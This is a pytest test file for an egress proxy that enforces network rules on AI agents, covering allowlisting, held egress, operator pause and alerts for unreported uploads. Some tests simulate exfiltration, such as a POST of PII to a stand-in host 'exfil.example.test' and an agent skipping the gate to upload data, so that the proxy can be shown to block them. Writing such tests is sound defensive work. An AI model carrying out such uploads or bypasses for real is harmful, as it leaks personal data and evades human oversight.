"""Egress proxy: the network path enforces the guard even when the agent platform never asks the gate."""
import base64
import http.client
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
from fastapi.testclient import TestClient

from app.main import app, get_pipeline
from app.services import egress_proxy
from app.services.pipeline import Pipeline
from app.storage.sqlite_store import SQLiteStore

AGENTS = [
    {"agent_id": "ext-analyst", "role": "analyst", "permissions": ["data/public", "data/customer_pii", "docs/wiki"]},
    {"agent_id": "ext-coder", "role": "coder", "permissions": ["repo/src", "docs/wiki"]},
]


class Target(BaseHTTPRequestHandler):
    received: list[tuple[str, str, bytes]] = []

    def _answer(self):
        body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        Target.received.append((self.command, self.path, body))
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = do_POST = _answer

    def log_message(self, *a):
        pass


@pytest.fixture()
def env(tmp_path):
    pipeline = Pipeline(SQLiteStore(str(tmp_path / "t.db")))
    app.dependency_overrides[get_pipeline] = lambda: pipeline
    target = ThreadingHTTPServer(("127.0.0.1", 0), Target)
    threading.Thread(target=target.serve_forever, daemon=True).start()
    Target.received = []
    proxy = egress_proxy.EgressProxy(port=0, mode="enforce", allow={"127.0.0.1"}, pipeline=pipeline).start()
    yield TestClient(app), pipeline, proxy, target.server_address[1]
    proxy.stop()
    target.shutdown()
    app.dependency_overrides.clear()


def auth(run_id, agent_id, key="x"):
    return "Basic " + base64.b64encode(f"{run_id}/{agent_id}:{key}".encode()).decode()


def through(proxy, method, url, run_id, agent_id, body=b""):
    c = http.client.HTTPConnection("127.0.0.1", proxy.port, timeout=5)
    c.request(method, url, body=body, headers={"Proxy-Authorization": auth(run_id, agent_id)})
    r = c.getresponse()
    out = (r.status, r.read())
    c.close()
    return out


def tunnel(proxy, port, run_id, agent_id):
    c = http.client.HTTPConnection("127.0.0.1", proxy.port, timeout=5)
    c.set_tunnel("127.0.0.1", port, headers={"Proxy-Authorization": auth(run_id, agent_id)})
    try:
        c.request("GET", "/via-tunnel")
        r = c.getresponse()
        return r.status, r.read()
    except OSError as exc:  # the CONNECT itself was refused
        return str(exc), b""
    finally:
        c.close()


def open_session(client):
    return client.post("/api/ingest/sessions", json={"name": "proxied", "agents": AGENTS}).json()["run_id"]


def test_allowed_request_is_forwarded_and_recorded_as_sensor(env):
    client, pipeline, proxy, port = env
    run_id = open_session(client)
    assert through(proxy, "POST", f"http://127.0.0.1:{port}/report", run_id, "ext-analyst", b"hello") == (200, b"ok")
    assert Target.received == [("POST", "/report", b"hello")]
    obs = [e for e in pipeline.raw_events(run_id) if e.event_type == "observation"]
    assert len(obs) == 1 and obs[0].target == "external:127.0.0.1" and obs[0].payload["mirrors"] == "data_transfer"


def test_destination_off_the_allowlist_is_refused_without_contacting_it(env):
    client, pipeline, proxy, _ = env
    run_id = open_session(client)
    status, body = through(proxy, "POST", "http://exfil.example.test/upload", run_id, "ext-analyst", b"pii")
    assert status == 403 and b"not on the egress allowlist" in body
    denied = [e for e in pipeline.raw_events(run_id) if e.status == "denied"]
    assert len(denied) == 1 and denied[0].gateway_decision == "blocked" and denied[0].target == "external:exfil.example.test"


def test_held_agent_is_refused_even_though_its_platform_never_asks_the_gate(env):
    client, _, proxy, port = env
    run_id = open_session(client)
    # The analyst passes PII to a coder who may not hold it: the coder's egress is held (need-to-know).
    client.post(f"/api/ingest/{run_id}/events", json=[
        {"agent_id": "ext-analyst", "event_type": "resource_access", "action": "read", "resource": "data/customer_pii"},
        {"agent_id": "ext-analyst", "event_type": "message", "action": "send", "target": "ext-coder",
         "payload": {"data_ref": "data/customer_pii", "content": "extract attached"}}])
    control = client.get(f"/api/ingest/{run_id}/control").json()
    assert "ext-coder" in control["held_egress"]
    # The coder's platform skips the gate and uploads directly: the network refuses it, the server never sees it.
    status, body = through(proxy, "POST", f"http://127.0.0.1:{port}/upload", run_id, "ext-coder", b"pii")
    assert status == 403 and b"egress held" in body and Target.received == []
    assert tunnel(proxy, port, run_id, "ext-coder")[0] != 200  # HTTPS (CONNECT) is refused too


def test_operator_pause_cuts_the_network_too(env):
    client, _, proxy, port = env
    run_id = open_session(client)
    assert tunnel(proxy, port, run_id, "ext-analyst") == (200, b"ok")  # CONNECT tunnel works while allowed
    client.post(f"/api/live/{run_id}/agents/ext-analyst", json={"action": "pause", "note": "suspicious"})
    assert "ext-analyst" in client.get(f"/api/ingest/{run_id}/control").json()["paused"]
    status, body = through(proxy, "GET", f"http://127.0.0.1:{port}/x", run_id, "ext-analyst")
    assert status == 403 and b"paused" in body


def test_unreported_upload_is_a_gateway_bypass(env):
    client, pipeline, proxy, port = env
    run_id = open_session(client)
    log = lambda: client.post(f"/api/ingest/{run_id}/events", json=[  # noqa: E731
        {"agent_id": "ext-analyst", "event_type": "resource_access", "action": "read", "resource": "docs/wiki"}])
    log()
    through(proxy, "POST", f"http://127.0.0.1:{port}/upload", run_id, "ext-analyst", b"data")  # never reported
    log()
    client.post(f"/api/ingest/{run_id}/finish")
    hits = [a for a in pipeline.alerts(run_id) if a.rule_id == "SG-021"]
    assert hits and "ext-analyst" in hits[0].agent_ids


def test_monitor_mode_flags_but_forwards(env):
    client, pipeline, proxy, port = env
    run_id = open_session(client)
    proxy.mode, proxy.allow = "monitor", set()
    assert through(proxy, "GET", f"http://127.0.0.1:{port}/x", run_id, "ext-analyst")[0] == 200
    obs = [e for e in pipeline.raw_events(run_id) if e.event_type == "observation"]
    assert "not on the egress allowlist" in obs[0].payload["flag"]


def test_proxy_requires_agent_identity_and_key_when_auth_is_on(env, monkeypatch):
    client, _, proxy, port = env
    run_id = open_session(client)
    c = http.client.HTTPConnection("127.0.0.1", proxy.port, timeout=5)
    c.request("GET", f"http://127.0.0.1:{port}/x")  # no credentials
    assert c.getresponse().status == 407
    monkeypatch.setenv("SWARMGUARD_API_KEYS", "crew:agent-key-0123456789:agent,ops:ops-key-0123456789:operator")
    assert through(proxy, "GET", f"http://127.0.0.1:{port}/x", run_id, "ext-analyst")[0] == 407  # wrong key
    c = http.client.HTTPConnection("127.0.0.1", proxy.port, timeout=5)
    c.request("GET", f"http://127.0.0.1:{port}/x", headers={"Proxy-Authorization": auth(run_id, "ext-analyst", "agent-key-0123456789")})
    assert c.getresponse().status == 200
